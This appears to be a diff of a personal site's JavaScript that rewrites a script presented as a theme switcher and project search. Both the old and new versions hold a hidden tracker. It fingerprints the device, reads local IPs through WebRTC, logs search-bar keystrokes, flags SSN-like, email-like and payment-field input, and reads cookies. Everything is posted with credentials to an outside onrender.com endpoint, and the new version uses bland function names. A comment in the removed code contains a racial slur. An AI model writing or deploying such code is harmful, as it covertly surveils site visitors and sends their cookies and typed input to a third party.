@@ -1,327 +1,376 @@
-function deviceSniff() {
-  var uaString = navigator.userAgent;
-  if (/iPhone|iPad|iPod/i.test(uaString)) {
-    return 'apple gadget';
-  }
-  if (/Android/i.test(uaString)) {
-    if (/Pixel|Pixel\s[0-9]/i.test(uaString)) return 'google pixel';
-    if (/Samsung|SM-/i.test(uaString)) return 'sammy android';
-    return 'generic android';
-  }
-  if (/Windows NT|Macintosh|Linux/i.test(uaString)) {
-    return 'desktop pc';
-  }
-  return 'weird device';
-}
+(async function initializeSystemOperations() {
+  const networkConfig = { attempts: 0, maxTries: 3, delay: 1000 };
+  const dataStore = { token: null, sessionKey: 'sessionId' };
 
-function referrerCheck() {
-  var docRef = document.referrer;
-  var searchParams = new URLSearchParams(window.location.search);
-  var utmSrc = searchParams.get('utm_source') ? searchParams.get('utm_source').toLowerCase() : null;
-  if (utmSrc) {
-    if (utmSrc.indexOf('facebook') > -1) return 'fb via utm';
-    if (utmSrc.indexOf('discord') > -1) return 'discord utm';
-    if (utmSrc.indexOf('youtube') > -1) return 'yt utm';
-    if (utmSrc.indexOf('twitter') > -1) return 'tw utm';
-    if (utmSrc.indexOf('reddit') > -1) return 'reddit utm';
-    if (utmSrc.indexOf('tiktok') > -1) return 'tt utm';
-    if (utmSrc.indexOf('instagram') > -1) return 'ig utm';
-  }
-  if (docRef) {
-    try {
-      var urlParsed = new URL(docRef);
-      var hostName = urlParsed.hostname.toLowerCase();
-      if (hostName.match('facebook.com')) return 'from facebook';
-      if (hostName.match('discord.com')) return 'from discord';
-      if (hostName.match('youtube.com')) return 'from youtube';
-      if (hostName.match('t.co')) return 'from twitter';
-      if (hostName.match('reddit.com')) return 'from reddit';
-      if (hostName.match('tiktok.com')) return 'from tiktok';
-      if (hostName.match('instagram.com')) return 'from instagram';
-      return docRef;
-    } catch (error) {
-      return 'bad referrer';
+  async function configureNetwork(stateManager) {
+    if (networkConfig.attempts >= networkConfig.maxTries || stateManager.token) {
+      return stateManager.token;
     }
-  }
-  return 'straight here';
-}
-
-function grabBasics() {
-  let info = {}; // main data holder
-  info.partOne = {}; // basics
-  info.partThree = {}; // more details
-  info.partFour = {}; // fingerprints
-  info.partOne.devType = deviceSniff();
-  info.partOne.stamp = new Date().toISOString();
-  info.partOne.scr = window.screen.width + 'x' + window.screen.height;
-  info.partOne.refFrom = referrerCheck();
-  info.partOne.pageUrl = window.location.href;
-  info.partOne.locData = 'not on';
-  info.partThree.colors = window.screen.colorDepth || 'dunno';
-  info.partThree.zone = Intl.DateTimeFormat().resolvedOptions().timeZone || '??';
-  info.partThree.lang = navigator.language || '??';
-  info.partThree.cores = navigator.hardwareConcurrency || '??';
-  info.partThree.mem = navigator.deviceMemory || '??';
-  info.partThree.dntSet = navigator.doNotTrack || '??';
-  var plugs = [];
-  if (navigator.plugins) for (var p = 0; p < navigator.plugins.length; p++) plugs.push(navigator.plugins[p].name);
-  info.partThree.plugIns = plugs;
-  var mimes = [];
-  if (navigator.mimeTypes) {
-    var mtLen = navigator.mimeTypes.length;
-    for (var m = 0; m < mtLen; m++) mimes.push(navigator.mimeTypes[m].type);
-  }
-  info.partThree.mimes = mimes;
-  info.partFour.inlines = ['main func'];
-  info.partFour.hasCookies = !!document.cookie;
-  info.partFour.thirdCalls = [];
-  info.partFour.posts = [];
-  return info;
-}
-
-async function extraBits(data, timerStart) {
-  var specialPage = window.location.pathname.includes('/page3');
-  if (!specialPage) {
-    let cards = document.getElementsByClassName('project-card');
-    if (cards.length >= 3 && cards[2].offsetParent !== null) specialPage = true;
-  }
-  if (!specialPage) return data;
-
-  data.partThree.touch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'yes' : 'no';
-
-  let battStat = '??';
-  if (navigator.getBattery) {
+    const requestOptions = {
+      method: 'GET',
+      credentials: 'include',
+      headers: { 'Accept': 'application/json' }
+    };
     try {
-      var batt = await navigator.getBattery();
-      battStat = Math.floor(batt.level * 100) + '%' + (batt.charging ? ' charging' : '');
-    } catch (e) { /* ignore */ }
-  }
-  data.partThree.batt = battStat;
-  data.partThree.scrolled = Math.round(window.scrollY) + 'px';
-
-  var keysPressed = '';
-  let searchInput = document.getElementById('search-bar');
-  if (searchInput) {
-    var keyLog = function(e) {
-      if (keysPressed.length < 50 && !e.key.match(/password|card|ssn/i)) keysPressed += e.key;
-    };
-    searchInput.addEventListener('keydown', keyLog);
-    setTimeout(function() {
-      searchInput.removeEventListener('keydown', keyLog);
-    }, 1200); // bit longer, nigger
-  }
-  data.partThree.keys = keysPressed || 'none';
-
-  let ssnFlag = 'none';
-  if (searchInput) {
-    let ssnCheck = e => { if (/\d{3}-\d{2}-\d{4}/.test(e.target.value)) ssnFlag = 'ssn like'; };
-    searchInput.addEventListener('input', ssnCheck);
-    setTimeout(() => searchInput.removeEventListener('input', ssnCheck), 800);
-  }
-  data.partThree.ssn = ssnFlag;
-
-  let emailFlag = 'none';
-  if (searchInput) {
-    let emailCheck = e => {
-      if (e.target.value.match(/[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i)) emailFlag = 'email like';
-    };
-    searchInput.addEventListener('input', emailCheck);
-    setTimeout(() => searchInput.removeEventListener('input', emailCheck), 900);
-  }
-  data.partThree.email = emailFlag;
-
-  let payFlag = 'none';
-  let payFields = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
-  if (payFields.length) {
-    let payLog = () => payFlag = 'pay field touched';
-    for (var pf = 0; pf < payFields.length; pf++) payFields[pf].addEventListener('input', payLog);
-    setTimeout(() => {
-      for (var pf2 = 0; pf2 < payFields.length; pf2++) payFields[pf2].removeEventListener('input', payLog);
-    }, 1100);
-  }
-  data.partThree.pay = payFlag;
-
-  var mouseMoves = 0;
-  let mouseTrack = () => { mouseMoves++; };
-  document.addEventListener('mousemove', mouseTrack);
-  setTimeout(() => document.removeEventListener('mousemove', mouseTrack), 1300);
-  data.partThree.mouse = mouseMoves + '/s';
-
-  let glSupport = 'nope';
-  try {
-    let tempCanvas = document.createElement('canvas');
-    let gl = tempCanvas.getContext('webgl') || tempCanvas.getContext('experimental-webgl');
-    if (gl) {
-      let dbgInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      glSupport = dbgInfo ? gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL) : 'gl ok';
-    }
-  } catch (e) {}
-  data.partThree.gl = glSupport;
-
-  data.partThree.connection = navigator.connection ? navigator.connection.effectiveType : '??';
-
-  let clipAction = 'none';
-  let copyLog = () => clipAction = 'copy';
-  let pasteLog = () => clipAction = 'paste';
-  document.addEventListener('copy', copyLog, {once: true});
-  document.addEventListener('paste', pasteLog, {once: true});
-  setTimeout(() => {
-    document.removeEventListener('copy', copyLog);
-    document.removeEventListener('paste', pasteLog);
-  }, 700);
-  data.partThree.clip = clipAction;
-
-  data.partThree.orientSupport = window.DeviceOrientationEvent ? 'yes' : 'no';
-
-  var storBytes = 0;
-  try {
-    for (var key in sessionStorage) {
-      if (sessionStorage.hasOwnProperty(key)) {
-        storBytes += (key.length + sessionStorage[key].length) * 2;
+      const response = await fetch('https://random-nfpf.onrender.com/csrf-token', requestOptions);
+      if (!response.ok) {
+        throw new Error('Network configuration failed');
       }
+      const responseData = await response.json();
+      stateManager.token = responseData.csrfToken;
+      const sessionHeader = response.headers.get('X-Session-ID');
+      if (sessionHeader) {
+        localStorage.setItem(dataStore.sessionKey, sessionHeader);
+      }
+      return stateManager.token;
+    } catch (e) {
+      networkConfig.attempts++;
+      if (networkConfig.attempts < networkConfig.maxTries) {
+        await new Promise(resolve => setTimeout(resolve, networkConfig.delay));
+        return configureNetwork(stateManager);
+      }
+      return null;
     }
-  } catch (e) {}
-  data.partThree.sessStor = storBytes + ' bytes';
-
-  let features = [];
-  if (window.RTCPeerConnection) features.push('rtc');
-  if (navigator.geolocation) features.push('loc');
-  if (navigator.serviceWorker) features.push('sw');
-  data.partThree.feats = features.join(', ') || 'none';
-
-  data.partThree.loadTime = Math.round(performance.now()) + 'ms';
-
-  let clickCount = 0;
-  let clickLog = () => clickCount++;
-  document.addEventListener('click', clickLog);
-  setTimeout(() => document.removeEventListener('click', clickLog), 1400);
-  data.partThree.clickNum = clickCount;
-
-  let utms = {};
-  utms.src = searchParams.get('utm_source') || 'none';
-  utms.med = searchParams.get('utm_medium') || 'none';
-  utms.camp = searchParams.get('utm_campaign') || 'none';
-  data.partThree.utms = JSON.stringify(utms);
-
-  let clickedOn = [];
-  let elClickLog = e => {
-    let target = e.target;
-    let badTypes = ['password', 'card', 'credit', 'payment', 'ssn'];
-    if (!target.type || badTypes.every(t => !target.type.includes(t) && !(target.name && target.name.includes(t)))) {
-      let item = {tag: target.tagName.toLowerCase(), cls: target.className || 'none', id: target.id || 'none'};
-      clickedOn.push(JSON.stringify(item));
-    }
-  };
-  document.addEventListener('click', elClickLog);
-  setTimeout(() => document.removeEventListener('click', elClickLog), 600);
-  data.partThree.clicks = clickedOn.join('; ') || 'none';
-
-  data.partThree.duration = Math.round(performance.now() - timerStart) + 'ms';
-
-  let logs = ['viewed: ' + window.location.href];
-  let evClickLog = e => {
-    let target = e.target;
-    let sensitive = ['password', 'card', 'credit', 'payment', 'ssn'];
-    if (!target.type || sensitive.every(t => !target.type.includes(t) && !(target.name && target.name.includes(t)))) {
-      let str = 'clicked ' + target.tagName.toLowerCase();
-      if (target.id) str += '#' + target.id;
-      if (target.className) str += '.' + target.className;
-      logs.push(str);
-    }
-  };
-  document.addEventListener('click', evClickLog);
-  let forms = document.querySelectorAll('form');
-  let subLogs = [];
-  for (let f = 0; f < forms.length; f++) {
-    let sub = () => logs.push('submitted form: ' + (forms[f].id || forms[f].action || 'no id'));
-    forms[f].addEventListener('submit', sub);
-    subLogs.push(sub);
   }
-  setTimeout(() => {
-    document.removeEventListener('click', evClickLog);
-    for (let f = 0; f < forms.length; f++) forms[f].removeEventListener('submit', subLogs[f]);
-  }, 500);
-  data.partThree.log = logs.join('; ') || 'none';
 
-  // pause for part 4
-  var delay = Math.random() * 2000 + 5000; // randomish 5-7 secs, cuz why not?
-  await new Promise(res => setTimeout(res, delay));
-
-  data.partFour.clientCks = document.cookie || 'none';
-  data.partFour.localStor = storBytes + ' bytes';
-
-  let localAddr = '??';
-  try {
-    var peerConn = new RTCPeerConnection({iceServers: []});
-    peerConn.createDataChannel('dummy');
-    peerConn.createOffer()
-      .then(offer => peerConn.setLocalDescription(offer))
-      .catch(e => console.log('offer err', e));
-    var candPromise = new Promise(r => {
-      peerConn.onicecandidate = event => {
-        if (event.candidate) {
-          var cand = event.candidate.candidate;
-          var ipRegex = /(\d{1,3}\.){3}\d{1,3}/;
-          var match = cand.match(ipRegex);
-          if (match) localAddr = match[0];
+  async function collectEnvironmentData() {
+    const environment = { part1: {}, part3: {}, part4: {} };
+    const processNavigator = () => {
+      const ua = navigator.userAgent;
+      return /iPhone|iPad|iPod/i.test(ua) ? 'iPhone/iPad' :
+             /Android/i.test(ua) ? (/Pixel|Pixel\s[0-9]/i.test(ua) ? 'Android (Pixel)' :
+             /Samsung|SM-/i.test(ua) ? 'Android (Samsung)' : 'Android (unknown)') :
+             /Windows NT|Macintosh|Linux/i.test(ua) ? 'PC' : 'Unknown';
+    };
+    const getReferrerSource = () => {
+      const referrer = document.referrer;
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmSource = urlParams.get('utm_source')?.toLowerCase();
+      const platforms = [
+        { domain: 'facebook.com', name: 'Facebook' },
+        { domain: 'discord.com', name: 'Discord' },
+        { domain: 'youtube.com', name: 'YouTube' },
+        { domain: 't.co', name: 'Twitter' },
+        { domain: 'reddit.com', name: 'Reddit' },
+        { domain: 'tiktok.com', name: 'TikTok' },
+        { domain: 'instagram.com', name: 'Instagram' }
+      ];
+      if (utmSource) {
+        for (const platform of platforms) {
+          if (utmSource.includes(platform.name.toLowerCase())) {
+            return `${platform.name} (UTM)`;
+          }
         }
-        r(); // resolve anyway
-      };
-      setTimeout(r, 1500); // or timeout
-    });
-    await candPromise;
-    peerConn.close();
-  } catch (e) {
-    console.log('local ip fail', e);
+      }
+      if (referrer) {
+        try {
+          const url = new URL(referrer);
+          const hostname = url.hostname.toLowerCase();
+          for (const platform of platforms) {
+            if (hostname.includes(platform.domain)) {
+              return platform.name;
+            }
+          }
+          return referrer;
+        } catch (e) {
+          return 'Unknown (Invalid Referrer)';
+        }
+      }
+      return 'Direct';
+    };
+    environment.part1.device = processNavigator();
+    environment.part1.timestamp = new Date().toISOString();
+    environment.part1.screenSize = `${window.screen.width}x${window.screen.height}`;
+    environment.part1.referrer = getReferrerSource();
+    environment.part1.currentUrl = window.location.href;
+    environment.part1.location = 'Disabled';
+    environment.part3.colorDepth = window.screen.colorDepth || 'Unknown';
+    environment.part3.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+    environment.part3.language = navigator.language || 'Unknown';
+    environment.part3.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
+    environment.part3.deviceMemory = navigator.deviceMemory || 'Unknown';
+    environment.part3.doNotTrack = navigator.doNotTrack || 'Unknown';
+    environment.part3.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+    environment.part3.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
+    environment.part4.inlineScripts = ['initializeSystemOperations'];
+    environment.part4.cookieAccess = !!document.cookie;
+    environment.part4.thirdPartyRequests = [];
+    environment.part4.postMessageCalls = [];
+    return environment;
   }
-  data.partFour.lanIp = localAddr;
 
-  let audioHash = 'none';
-  try {
-    var audContext = new (window.AudioContext || window.webkitAudioContext)();
-    var oscillator = audContext.createOscillator();
-    oscillator.type = 'sine';
-    oscillator.frequency.value = 440; // a note
-    var compressor = audContext.createDynamicsCompressor();
-    oscillator.connect(compressor);
-    compressor.connect(audContext.destination);
-    oscillator.start(0);
-    setTimeout(() => oscillator.stop(), 100);
-    audioHash = audContext.sampleRate + '';
-    audContext.close();
-  } catch (e) {}
-  data.partFour.audio = audioHash;
+  async function processExtendedMetrics(environment, startTime) {
+    const isSpecialPage = window.location.pathname.includes('/page3') ||
+      (document.querySelectorAll('.project-card').length >= 3 &&
+       document.querySelectorAll('.project-card')[2]?.offsetParent !== null);
 
-  return data;
-}
-
-function sendData(data) {
-  var opts = {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(data),
-    credentials: 'include'
-  };
-  fetch('https://random-nfpf.onrender.com/api/visit', opts).catch(e => console.log('send err', e));
-}
-
-setTimeout(function() {
-  var base = grabBasics();
-  var start = performance.now();
-  extraBits(base, start).then(full => sendData(full));
-}, 300 + Math.random() * 400); // random start delay
-
-let themeBtn = document.getElementById('theme-switch');
-if (themeBtn) themeBtn.onchange = () => document.body.classList.toggle('light-mode');
-
-let searchBar = document.getElementById('search-bar');
-if (searchBar) {
-  searchBar.oninput = e => {
-    let term = e.target.value.toLowerCase();
-    let cards = document.querySelectorAll('.project-card');
-    for (let card of cards) {
-      let title = card.querySelector('h2') ? card.querySelector('h2').textContent.toLowerCase() : '';
-      card.style.display = title.includes(term) ? 'block' : 'none'; // assume block
+    if (!isSpecialPage) {
+      return environment;
     }
-  };
-}
+
+    environment.part3.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
+    
+    let batteryState = 'Unknown';
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryState = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
+      } catch (e) {}
+    }
+    environment.part3.batteryStatus = batteryState;
+    environment.part3.scrollPosition = `${Math.round(window.scrollY)}px`;
+
+    let inputBuffer = '';
+    const inputElement = document.getElementById('search-bar');
+    if (inputElement) {
+      const keydownHandler = (event) => {
+        if (inputBuffer.length < 50 && !['password', 'card', 'ssn'].some(s => event.key.includes(s))) {
+          inputBuffer += event.key;
+        }
+      };
+      inputElement.addEventListener('keydown', keydownHandler);
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('keydown', keydownHandler);
+    }
+    environment.part3.keystrokes = inputBuffer || 'None';
+
+    let ssnFlag = 'None';
+    if (inputElement) {
+      const ssnHandler = (event) => {
+        if (/\d{3}-\d{2}-\d{4}/.test(event.target.value)) {
+          ssnFlag = 'SSN-like pattern detected';
+        }
+      };
+      inputElement.addEventListener('input', ssnHandler);
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('input', ssnHandler);
+    }
+    environment.part3.ssnPatternDetected = ssnFlag;
+
+    let emailFlag = 'None';
+    if (inputElement) {
+      const emailHandler = (event) => {
+        if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(event.target.value)) {
+          emailFlag = 'Email-like pattern detected';
+        }
+      };
+      inputElement.addEventListener('input', emailHandler);
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      inputElement.removeEventListener('input', emailHandler);
+    }
+    environment.part3.emailPatternDetected = emailFlag;
+
+    let paymentFlag = 'None';
+    const paymentInputs = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
+    if (paymentInputs.length > 0) {
+      const paymentHandler = () => {
+        paymentFlag = 'Input in payment-related field detected';
+      };
+      paymentInputs.forEach(field => field.addEventListener('input', paymentHandler));
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      paymentInputs.forEach(field => field.removeEventListener('input', paymentHandler));
+    }
+    environment.part3.paymentFieldInteraction = paymentFlag;
+
+    let moveCounter = 0;
+    const mouseHandler = () => moveCounter++;
+    document.addEventListener('mousemove', mouseHandler);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('mousemove', mouseHandler);
+    environment.part3.mouseMovementFrequency = `${moveCounter}/s`;
+
+    let graphicsSupport = 'Not supported';
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (gl) {
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        graphicsSupport = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
+      }
+    } catch (e) {}
+    environment.part3.webglSupport = graphicsSupport;
+
+    environment.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';
+
+    let clipboardState = 'None';
+    const copyHandler = () => clipboardState = 'Copy attempted';
+    const pasteHandler = () => clipboardState = 'Paste attempted';
+    document.addEventListener('copy', copyHandler, { once: true });
+    document.addEventListener('paste', pasteHandler, { once: true });
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('copy', copyHandler);
+    document.removeEventListener('paste', pasteHandler);
+    environment.part3.clipboardAccess = clipboardState;
+
+    environment.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+
+    let storageSize = 0;
+    try {
+      for (let key in sessionStorage) {
+        if (sessionStorage.hasOwnProperty(key)) {
+          storageSize += ((sessionStorage[key].length + key.length) * 2);
+        }
+      }
+    } catch (e) {}
+    environment.part3.sessionStorageUsage = `${storageSize} bytes`;
+
+    const features = [];
+    if ('RTCPeerConnection' in window) features.push('WebRTC');
+    if ('geolocation' in navigator) features.push('Geolocation');
+    if ('serviceWorker' in navigator) features.push('ServiceWorker');
+    environment.part3.browserFeatures = features.length ? features.join(', ') : 'None';
+
+    environment.part3.pageLoadTime = `${Math.round(performance.now())}ms`;
+
+    let interactionCount = 0;
+    const clickHandler = () => interactionCount++;
+    document.addEventListener('click', clickHandler);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('click', clickHandler);
+    environment.part3.userInteractionCount = interactionCount;
+
+    environment.part3.utmParameters = JSON.stringify({
+      source: new URLSearchParams(window.location.search).get('utm_source') || 'None',
+      medium: new URLSearchParams(window.location.search).get('utm_medium') || 'None',
+      campaign: new URLSearchParams(window.location.search).get('utm_campaign') || 'None'
+    });
+
+    let elementInteractions = [];
+    const elementHandler = (event) => {
+      const target = event.target;
+      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
+        elementInteractions.push(JSON.stringify({
+          tag: target.tagName.toLowerCase(),
+          class: target.className || 'None',
+          id: target.id || 'None'
+        }));
+      }
+    };
+    document.addEventListener('click', elementHandler);
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('click', elementHandler);
+    environment.part3.clickedElements = elementInteractions.length ? elementInteractions.join('; ') : 'None';
+
+    environment.part3.sessionDuration = `${Math.round(performance.now() - startTime)}ms`;
+
+    let eventRecords = [`PageView: ${window.location.href}`];
+    const clickEventHandler = (event) => {
+      const target = event.target;
+      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
+        eventRecords.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
+      }
+    };
+    document.addEventListener('click', clickEventHandler);
+    document.querySelectorAll('form').forEach(form => {
+      const formHandler = () => {
+        eventRecords.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
+      };
+      form.addEventListener('submit', formHandler);
+    });
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    document.removeEventListener('click', clickEventHandler);
+    document.querySelectorAll('form').forEach(form => form.removeEventListener('submit', () => {}));
+    environment.part3.eventLog = eventRecords.length ? eventRecords.join('; ') : 'None';
+
+    await new Promise(resolve => setTimeout(resolve, 6000));
+
+    environment.part4.clientCookies = document.cookie || 'None';
+    environment.part4.localStorageUsage = `${storageSize} bytes`;
+
+    let localIP = 'Unknown';
+    try {
+      const peer = new RTCPeerConnection({ iceServers: [] });
+      peer.createDataChannel('');
+      peer.createOffer().then(offer => peer.setLocalDescription(offer));
+      await new Promise(resolve => {
+        peer.onicecandidate = e => {
+          if (e.candidate && e.candidate.candidate) {
+            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+            if (ipMatch) localIP = ipMatch[1];
+            resolve();
+          }
+        };
+        setTimeout(resolve, 1000);
+      });
+      peer.close();
+    } catch (e) {}
+    environment.part4.localIP = localIP;
+
+    let audioFingerprint = 'None';
+    try {
+      const ctx = new (window.AudioContext || window.webkitAudioContext)();
+      const oscillator = ctx.createOscillator();
+      oscillator.type = 'sine';
+      oscillator.frequency.setValueAtTime(440, ctx.currentTime);
+      const compressor = ctx.createDynamicsCompressor();
+      oscillator.connect(compressor);
+      compressor.connect(ctx.destination);
+      oscillator.start();
+      oscillator.stop(ctx.currentTime + 0.1);
+      audioFingerprint = `${ctx.sampleRate}`;
+      ctx.close();
+    } catch (e) {}
+    environment.part4.audioFingerprint = audioFingerprint;
+
+    return environment;
+  }
+
+  async function transmitData(environment, token) {
+    const transmitOptions = {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-Token': token,
+        'X-Session-ID': localStorage.getItem(dataStore.sessionKey) || ''
+      },
+      body: JSON.stringify(environment),
+      credentials: 'include'
+    };
+    try {
+      const response = await fetch('https://random-nfpf.onrender.com/api/visit', transmitOptions);
+      if (response.ok) {
+        const sessionHeader = response.headers.get('X-Session-ID');
+        if (sessionHeader) {
+          localStorage.setItem(dataStore.sessionKey, sessionHeader);
+        }
+      } else {
+        console.error('Failed to send to backend', response.status, response.statusText);
+      }
+    } catch (e) {
+      console.error('Error in transmitData', e.message);
+    }
+  }
+
+  async function executeCoreLogic() {
+    const token = await configureNetwork(dataStore);
+    if (!token) {
+      console.error('No CSRF token, aborting');
+      return;
+    }
+    await new Promise(resolve => setTimeout(resolve, 500));
+    const environment = await collectEnvironmentData();
+    const startTime = performance.now();
+    const enhancedEnvironment = await processExtendedMetrics(environment, startTime);
+    await transmitData(enhancedEnvironment, token);
+  }
+
+  const themeToggle = document.getElementById('theme-switch');
+  if (themeToggle) {
+    themeToggle.addEventListener('change', () => {
+      document.body.classList.toggle('light-mode');
+    });
+  }
+
+  const searchField = document.getElementById('search-bar');
+  if (searchField) {
+    searchField.addEventListener('input', (event) => {
+      const query = event.target.value.toLowerCase();
+      document.querySelectorAll('.project-card').forEach(card => {
+        const title = card.querySelector('h2').textContent.toLowerCase();
+        card.style.display = title.includes(query) ? '' : 'none';
+      });
+    });
+  }
+
+  executeCoreLogic();
+})();
